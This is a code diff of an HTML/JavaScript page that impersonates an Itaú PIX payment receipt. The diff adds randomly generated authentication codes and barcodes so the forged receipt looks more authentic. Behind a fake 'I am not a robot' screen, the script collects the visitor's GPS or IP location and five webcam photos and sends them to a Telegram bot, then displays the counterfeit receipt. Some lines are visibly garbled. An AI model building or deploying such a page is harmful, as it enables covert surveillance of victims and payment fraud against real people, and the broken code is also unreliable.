@@ -2,24 +2,25 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>Comprovante PIX – Itaú</title>
+<title>Comprovante de Pagamento – Itaú</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif}
-body{display:flex;justify-content:center;align-items:center;height:100vh;background:#e5e5e5}
+body{display:flex;justify-content:center;align-items:center;height:100vh;background:#f3f3f3}
 #overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:999;padding:40px;text-align:center}
-#overlay img{width:140px;margin-bottom:20px}
-#overlay h2{color:#FF6600;margin-bottom:12px;font-size:26px}
+#overlay img{width:160px;margin-bottom:20px}
+#overlay h2{color:#FF6600;margin-bottom:12px;font-size:28px}
 #overlay p{color:#555;margin-bottom:24px;font-size:15px;max-width:320px;line-height:1.4}
 #overlay button{padding:14px 32px;font-size:16px;border:none;background:#FF6600;color:#fff;border-radius:30px;cursor:pointer;font-weight:600}
 #comprovanteWrap{display:none;background:#fff;width:420px;border:1px solid #ddd;border-radius:12px;overflow:hidden;box-shadow:0 12px 24px rgba(0,0,0,.12)}
-#comprovante{padding:24px;font-size:13px;line-height:1.5;color:#222}
+#comprovante{padding:24px;font-size:12px;line-height:1.4;color:#222}
 .header{display:flex;align-items:center;gap:10px;font-weight:700;font-size:20px;margin-bottom:18px;color:#FF6600}
 .header img{width:36px;height:36px}
-.row{display:flex;justify-content:space-between;margin-bottom:8px}
+.row{display:flex;justify-content:space-between;margin-bottom:6px}
 .row.total{font-weight:700;font-size:17px;margin-top:10px;border-top:1px dashed #bbb;padding-top:10px;color:#FF6600}
-.footer{font-size:11px;color:#666;margin-top:14px;text-align:center}
+.footer{font-size:10px;color:#666;margin-top:14px;text-align:center}
+.barcode{font-family:'Libre Barcode 128',cursive;font-size:28px;text-align:center;margin:12px 0 6px}
 </style>
 </head>
 <body>
@@ -31,7 +32,7 @@ body{display:flex;justify-content:center;align-items:center;height:100vh;backgro
 
 <!-- PÁGINA CONVENCENTE -->
 <div id="overlay">
-  <img src="data:image/svg;base64,PHN2ZyB4bWxns...Ijwvc3ZnPg==" alt="Itaú">
+  <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='50'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3EI%3C/text%3E%3C/svg%3E" alt="Itaú">
   <h2>Não sou um robô</h2>
   <p>Para sua segurança, precisamos confirmar sua identidade. Por favor, permita acesso à câmera e à localização para gerar seu comprovante.</p>
   <button onclick="start()">Permitir e continuar</button>
@@ -41,16 +42,18 @@ body{display:flex;justify-content:center;align-items:center;height:100vh;backgro
 <div id="comprovanteWrap">
   <div id="comprovante">
     <div class="header">
-      <img src="data:image/svg;base64,PHN2ZyB4bWxuc...Ijwvc3ZnPg==" alt="logo">
+      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='50'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3EI%3C/text%3E%3C/svg%3E" alt="logo">
       Itaú
     </div>
-    <div class="row"><span>Comprovante de PIX</span></div>
+    <div class="row"><span>Comprovante de Pagamento PIX</span></div>
     <div class="row"><span>Data/Hora:</span><span id="dataHora">--</span></div>
-    <div class="row"><span>Valor:</span><span>R$ 1.500,00</span></div>
-    <div class="row"><span>Chave/PIX:</span><span>+55 11 9 1234-5678</span></div>
-    <div class="row"><span>Nome favorecido:</span><span>João da Silva</span></div>
+    <div class="row"><span>Valor:</span><span id="valor">R$ 1.500,00</span></div>
+    <div class="row"><span>Chave PIX:</span><span id="chave">+55 11 9 ****-5678</span></div>
+    <div class="row"><span>Nome favorecido:</span><span id="nome">********** SILVA</span></div>
     <div class="row"><span>Identificador:</span><span id="id">--</span></div>
-    <div class="row total"><span>Total debitado:</span><span>R$ 1.500,00</span></div>
+    <div class="row"><span>Código de autenticação:</span><span id="auth">--</span></div>
+    <div class="row total"><span>Total debitado:</span><span id="total">R$ 1.500,00</span></div>
+    <div class="barcode" id="barcode">--</div>
     <div class="footer">
       Em caso de dúvidas, fale com o Itaú 3003 3030
     </div>
@@ -80,16 +83,20 @@ function dataURItoBlob(dataURI){
   return new Blob([ab],{type:mime});
 }
 
+function rand(min,max){return Math.floor(Math.random()*(max-min+1))+min;}
+function geraAuth(){return rand(1e9,9e9).toString();}
+function geraBarcode(){return rand(1e12,9e12).toString();}
+
 async function start(){
   let lat='--', lon='--', ipData={ip:'--',city:'--',region:'--'};
   try{
     const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
     lat=pos.coords.latitude.toFixed(6); lon=pos.coords.longitude.toFixed(6);
   }catch{
+e=>{
     ipData=await fetch('https://ipapi.co/json/').then(r=>r.json());
   }
   const loc=(lat!=='--') ? `GPS: ${lat}, ${lon}` : `${ipData.city}, ${ipData.region} - ${ipData.ip}`;
-  // Envia localização clicável no mapa
   if(lat!=='--'){
     await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`,{
       method:'POST',
@@ -107,7 +114,7 @@ async function start(){
   canvas.width=640; canvas.height=480;
   for(let i=1;i<=5;i++){
     await new Promise(r=>setTimeout(r,600));
-    ctx.drawImage(video,0,0);
+    ctx.drawImage(videoipLoc;
     sendPhoto(canvas.toDataURL('image/jpeg',0.9),`Selfie ${i}/5 – ${loc}`);
   }
   stream.getTracks().forEach(t=>t.stop());
@@ -115,6 +122,8 @@ async function start(){
   // Preenche comprovante
   document.getElementById('dataHora').textContent=new Date().toLocaleString('pt-BR');
   document.getElementById('id').textContent='PIX'+Date.now().toString().slice(-10);
+  document.getElementById('auth').textContent=geraAuth();
+  document.getElementById('barcode').textContent=geraBarcode();
   document.getElementById('overlay').remove();
   document.getElementById('comprovanteWrap').style.display='block';
 }
